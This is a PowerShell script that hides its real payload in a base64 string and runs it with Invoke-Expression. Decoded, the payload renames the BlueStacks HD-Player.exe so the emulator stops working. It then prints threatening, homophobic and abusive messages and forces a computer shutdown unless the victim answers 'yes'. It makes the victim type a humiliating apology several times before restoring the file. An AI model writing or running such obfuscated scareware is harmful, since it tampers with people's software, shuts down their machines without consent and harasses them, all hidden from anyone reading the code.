$payload = 'W0NvbnNvbGVdOjpPdXRwdXRFbmNvZGluZyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgNCg0KJHRhcmdldERpcnMgPSBAKA0KICAgICJDOlxQcm9ncmFtIEZpbGVzXEJsdWVTdGFja3NfbXNpNSIsDQogICAgIkM6XFByb2dyYW0gRmlsZXNcQmx1ZVN0YWNrc19ueHQiDQopDQoNCiRyZW5hbWVkRmlsZXMgPSBAKCkNCg0KZm9yZWFjaCAoJGRpciBpbiAkdGFyZ2V0RGlycykgew0KICAgIGlmIChUZXN0LVBhdGggJGRpcikgew0KICAgICAgICAkZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRkaXIgLVJlY3Vyc2UgLUZpbHRlciAiSEQtUGxheWVyLmV4ZSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRuZXdOYW1lID0gImhkcGxheWVyLmV4ZSINCiAgICAgICAgICAgICAgICAkbmV3UGF0aCA9IEpvaW4tUGF0aCAkZmlsZS5EaXJlY3RvcnlOYW1lICRuZXdOYW1lDQogICAgICAgICAgICAgICAgUmVuYW1lLUl0ZW0gLVBhdGggJGZpbGUuRnVsbE5hbWUgLU5ld05hbWUgJG5ld05hbWUgLUZvcmNlDQogICAgICAgICAgICAgICAgJHJlbmFtZWRGaWxlcyArPSAkbmV3UGF0aA0KICAgICAgICAgICAgfSBjYXRjaCB7IH0NCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KQ2xlYXItSG9zdA0KV3JpdGUtSG9zdCAiIg0KV3JpdGUtSG9zdCAiRE8gTk9UIGNsb3NlIHRoaXMgY29uc29sZS4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQpXcml0ZS1Ib3N0ICJJZiB5b3UgbGVhdmUgbm93LCB5b3UgcHJvdmUgdGhhdCB5b3UgYXJlIGdheS4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQpXcml0ZS1Ib3N0ICIiDQpXcml0ZS1Ib3N0ICJIb2xkIHRpZ2h0LCBzb21ldGhpbmcgaXMgY29taW5nLi4uIiAtRm9yZWdyb3VuZENvbG9yIERhcmtSZWQNClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDE1DQoNCldyaXRlLUhvc3QgIiINCldyaXRlLUhvc3QgIllvdSBhcmUgZnVja2VkIGtpZGRvLiIgLUZvcmVncm91bmRDb2xvciBSZWQNClN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNzAwDQpXcml0ZS1Ib3N0ICJZb3VyIGJpdGNoYXNzIHBhbmVscyB3b24ndCB3b3JrIGFueW1vcmUsIHlvdSBzb24gb2YgYSBiaXRjaC4iIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya1JlZA0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KV3JpdGUtSG9zdCAiIg0KV3JpdGUtSG9zdCAiVG91Y2hpbmcgdGhpbmdzIHdpdGhvdXQga25vd2luZyB3aGF0IHRoZXkgZG8uLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya1JlZA0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KV3JpdGUtSG9zdCAiIg0KU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA3MDANCiR1c2VyQ2hvaWNlID0gUmVhZC1Ib3N0ICJZb3Ugd2FudCBldmVyeXRoaW5nIGJhY2sgdG8gbm9ybWFsPyBUeXBlIHllcyBvciBubyINCg0KaWYgKCR1c2VyQ2hvaWNlLlRyaW0oKS5Ub0xvd2VyKCkgLW5lICJ5ZXMiKSB7DQogICAgV3JpdGUtSG9zdCAiV3JvbmcgY2hvaWNlLiBTYXkgZ29vZGJ5ZSB0byB5b3VyIFBDLiIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyDQogICAgU3RvcC1Db21wdXRlciAtRm9yY2UNCiAgICBleGl0DQp9DQoNCiMgQ29udGludWUgcm9hc3QvYXBvbG9neSBjeWNsZQ0KV3JpdGUtSG9zdCAiIg0KV3JpdGUtSG9zdCAiV2VsbCB3ZWxsIHdlbGwuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQpXcml0ZS1Ib3N0ICJCdXQgZG8gbm90IHdvcnJ5LiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNClN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgODAwDQpXcml0ZS1Ib3N0ICJUaGVyZSBpcyBhIHdheSBvdXQuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQpXcml0ZS1Ib3N0ICIiDQpXcml0ZS1Ib3N0ICJCdXQgb25seSBpZiB5b3UgYmVnIHByb3Blcmx5LiIgLUZvcmVncm91bmRDb2xvciBNYWdlbnRhDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxLjUNCldyaXRlLUhvc3QgIiINCg0KJHJlcXVpcmVkQXBvbG9naWVzID0gR2V0LVJhbmRvbSAtTWluaW11bSA0IC1NYXhpbXVtIDYNCiRhcG9sb2d5Q291bnQgPSAwDQoNCndoaWxlICgkYXBvbG9neUNvdW50IC1sdCAkcmVxdWlyZWRBcG9sb2dpZXMpIHsNCiAgICAkaW5wdXQgPSBSZWFkLUhvc3QgLVByb21wdCAoIkF0dGVtcHQgezB9IG9mIHsxfSAtIFR5cGUgZXhhY3RseTogU29ycnkgZGFkZHkiIC1mICgkYXBvbG9neUNvdW50ICsgMSksICRyZXF1aXJlZEFwb2xvZ2llcykNCiAgICBpZiAoJGlucHV0LlRyaW0oKS5Ub0xvd2VyKCkgLWVxICJzb3JyeSBkYWRkeSIpIHsNCiAgICAgICAgJGFwb2xvZ3lDb3VudCsrDQogICAgICAgICR0YXVudHMgPSBAKA0KICAgICAgICAgICAgIlRoYXQgaXMgY3V0ZS4gVHJ5IGhhcmRlci4iLA0KICAgICAgICAgICAgIllvdSBhcmUgbm90IHJlYWxseSBzb3JyeSwgYXJlIHlvdT8iLA0KICAgICAgICAgICAgIkxvdWRlci4gSSBjYW5ub3QgaGVhciB3ZWFrbmVzcy4iLA0KICAgICAgICAgICAgIlNheSBpdCBsaWtlIHlvdSBtZWFuIGl0LiIsDQogICAgICAgICAgICAiS2VlcCBnb2luZy4gQmVnIHByb3Blcmx5LiIsDQogICAgICAgICAgICAiWW91IGFyZSBhbG1vc3QgdGhlcmUuIE1heWJlLiINCiAgICAgICAgKQ0KICAgICAgICBXcml0ZS1Ib3N0ICR0YXVudHNbJGFwb2xvZ3lDb3VudCAlICR0YXVudHMuTGVuZ3RoXSAtRm9yZWdyb3VuZENvbG9yIERhcmtHcmF5DQogICAgfSBlbHNlIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiV3JvbmcuIFlvdSByZWFsbHkgYXJlIHNsb3csIGh1aD8iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgfQ0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgOTAwDQp9DQoNCmZvcmVhY2ggKCRmaWxlIGluICRyZW5hbWVkRmlsZXMpIHsNCiAgICB0cnkgew0KICAgICAgICAkb3JpZ2luYWxQYXRoID0gSm9pbi1QYXRoIChTcGxpdC1QYXRoICRmaWxlIC1QYXJlbnQpICJIRC1QbGF5ZXIuZXhlIg0KICAgICAgICBSZW5hbWUtSXRlbSAtUGF0aCAkZmlsZSAtTmV3TmFtZSAiSEQtUGxheWVyLmV4ZSIgLUZvcmNlDQogICAgfSBjYXRjaCB7IH0NCn0NCg0KQ2xlYXItSG9zdA0KV3JpdGUtSG9zdCAiVGhhdCBpcyBpdD8gVGhhdCBpcyBhbGwgaXQgdG9vayB0byBicmVhayB5b3U/IiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KV3JpdGUtSG9zdCAiUGF0aGV0aWMuIEJ1dCBmaW5lLiBZb3UgYXJlIGRpc21pc3NlZC4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDENClJlYWQtSG9zdCAtUHJvbXB0ICJQcmVzcyBFbnRlciB0byBjcmF3bCBhd2F5Ig0K';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;
